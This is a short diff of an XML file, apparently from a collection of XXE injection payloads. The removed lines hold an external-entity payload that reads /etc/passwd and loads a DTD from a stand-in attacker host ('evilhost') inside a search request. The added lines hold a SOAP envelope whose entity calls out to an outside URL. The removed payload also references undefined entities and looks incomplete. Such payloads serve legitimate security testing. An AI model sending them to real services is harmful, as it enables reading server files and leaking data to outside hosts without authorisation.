@@ -1,14 +1,8 @@
-<?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<!DOCTYPE foo [
-<!ENTITY % b SYSTEM "file:///etc/passwd">
-<!ENTITY % asd SYSTEM "http://evilhost/xx.html"> %asd; %rrr;]>
-<params>
-<offset>0</offset>
-<queryParams>
-<query>&xxe;</query>
-<sortBy>relevance</sortBy>
-<fieldList>["id", "title"]</fieldList>
-</queryParams>
-<source>marketplace</source>
-<rows>5</rows>
-</params>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "https://bitquark.co.uk/?xxe">]>
+<SOAP-ENV:Envelope>
+  <SOAP-ENV:Body>
+    <getStatus>
+    <id>&xxe;</id>
+    </getStatus>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
